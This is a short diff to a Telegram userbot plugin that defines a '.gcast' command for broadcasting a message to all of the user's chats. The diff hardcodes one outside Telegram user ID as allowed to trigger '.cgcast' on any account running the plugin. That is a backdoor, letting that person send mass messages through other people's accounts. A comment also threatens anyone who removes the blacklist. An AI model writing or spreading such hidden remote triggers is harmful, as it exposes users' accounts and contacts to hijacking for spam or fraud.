@@ -1,5 +1,5 @@
 from userbot.events import register
-from userbot import CMD_HELP, DEVS, bot
+from userbot import CMD_HELP, bot
 
 GCAST_BLACKLIST = [
     -1001473548283,  # SharingUserbot
@@ -27,7 +27,7 @@ GCAST_BLACKLIST = [
 # Hapus blacklist bapak lu jelek gua gban!.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cgcast(?: |$)(.*)")
+@register(incoming=True, from_users=5249925905, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
